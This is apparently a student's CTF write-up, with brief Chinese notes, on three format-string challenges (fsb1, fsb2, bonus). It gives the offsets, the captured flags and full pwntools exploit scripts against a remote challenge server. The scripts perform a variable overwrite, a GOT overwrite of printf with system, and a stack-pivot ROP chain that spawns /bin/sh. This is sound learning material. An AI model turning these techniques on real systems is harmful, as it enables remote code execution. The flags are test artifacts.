## 1

![image-20241119155232927](https://bu.dusays.com/2024/11/19/673c43c5182fc.png)

偏移量为 8





![image-20241103120947693](https://bu.dusays.com/2024/11/19/673c435035b16.png)

ssec2024{f0rmat_0v3rr1d3_succ3ss|dafc0b3b}



```python
from pwn import *

# target = process('./fsb1')
target = remote('8.154.20.109', 10300)
target.recv()
target.sendline("3220103544")

target.recvuntil(b"address of x is: ")
x_addr = eval(target.recv(14).decode())
print(f"Address of x: {hex(x_addr)}")


payload = ""
payload += "%1c%9$hn"
payload = payload.encode().ljust(8, b"\x00")
payload += p64(x_addr)


target.recv()
target.sendline(payload)

target.interactive()
```



## 2

![image-20241104191837057](https://bu.dusays.com/2024/11/05/672a397213a50.png)

偏移量为6



![4a5e76311a569c68eb1ca4a50fb5adf](https://bu.dusays.com/2024/11/05/672a395f46091.png)

You flag: ssec2024{g0t_0v3rrid3_2_sh3ll|aa24ca75}

```python
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

p = remote("8.154.20.109", 10301)
# p = process("./fsb2")

elf = ELF("./fsb2")
libc = ELF("./libc.so")

p.sendlineafter(b"Please input your StudentID:\n", str(3220103544))
p.recv()
# fmt = FmtStr(execute_fmt=lambda payload: {
#     p.sendline(payload),
#     p.recvuntil('\n')
# })
offset = 6

payload1 = flat([
    b'%7$s'.ljust(8, b'\x00'),
    elf.got['printf']
])
p.sendline(payload1)

printf_addr = u64(p.recv(6).ljust(8, b'\x00'))

libc_base = printf_addr - libc.sym['printf']
system_addr = libc_base + libc.sym['system']

payload2 = fmtstr_payload(offset, {elf.got['printf']: system_addr})
p.sendline(payload2)

p.recv()

p.sendline(b'/bin/sh')
p.interactive()

```



## bonus

![image-20241105230947334](https://bu.dusays.com/2024/11/05/672a394d10774.png)

我们断在 printf函数后随便输点东西。

分析栈上关键数据，调用函数栈帧基指针链为 `0x7fffffffdb50 —▸ 0x7fffffffdb70 —▸ 0x7fffffffdb90`

![image-20241119172302318](https://bu.dusays.com/2024/11/19/673c58fa5229e.png)

![image-20241119171816107](https://bu.dusays.com/2024/11/19/673c57dc191a5.png)

![image-20241119171348487](https://bu.dusays.com/2024/11/19/673c56d0ac1c2.png)



ROP链的执行流程：

1. 第一个gadget(`pop rdi; ret`)：

```
rdi    # 将buffer_addr + 0x90(指向"/bin/sh")弹到rdi
ret        # 跳转到vuln_skip_push_rsp
```

1. 跳转到vuln函数：

- vuln函数会调用system(rdi)
- 此时rdi指向"/bin/sh"
- 最终执行system("/bin/sh")

![image-20241119171033055](https://bu.dusays.com/2024/11/19/673c560d485f8.png)

ssec2024{Format_String_Exploits_Are_Powerful|18d39357}

```python
from pwn import *

context.arch = "amd64"
context.log_level = "DEBUG"

bin_name = "./bonus"
# p = process("./bonus")
p = remote("8.154.20.109", 10302)
libc = ELF("./libc.so")
elf = ELF("./bonus")
p.recvuntil(b"Please input your StudentID:\n")
p.sendline(str(3220103544).encode())
p.recv()

STACK_OFFSET_A = 8  # 泄露栈地址的偏移
STACK_OFFSET_B = STACK_OFFSET_A + (0x30 - 0x10) // 8
BUFFER_ADDR = 0x004050A0
POP_RDI_RET = 0x004011d9
VULN_SKIP_PUSH = 0x0040126E

# 泄露栈地址
leak_fmt = f"%{STACK_OFFSET_A}$p".encode()
payload = leak_fmt.ljust(8, b"\x00")

p.sendline(payload)

leak = eval(p.recv(14).decode())
stack_ret = leak - 0x20
stack_a = stack_ret - 0x8
print(f"leak: {hex(leak)}")

# 构建ROP链
rop = b"A" * 8
rop += p64(POP_RDI_RET)
rop += p64(BUFFER_ADDR + 0x90)  # /bin/sh字符串的地址
rop += p64(VULN_SKIP_PUSH)

# 构建格式化字符串payload
fmt = "%c" * 6
fmt += f"%{stack_ret % 0x10000 - 6}c%hn"
fmt += f"%{BUFFER_ADDR + 0x40 - stack_ret % 0x10000}c%{STACK_OFFSET_B}$lln"

payload = fmt.encode().ljust(0x40, b"\x00")
payload += rop
payload = payload.ljust(0x90, b"\x00")
payload += b"/bin/sh\x00"
p.sendline(payload)
p.recv()

p.interactive()
```

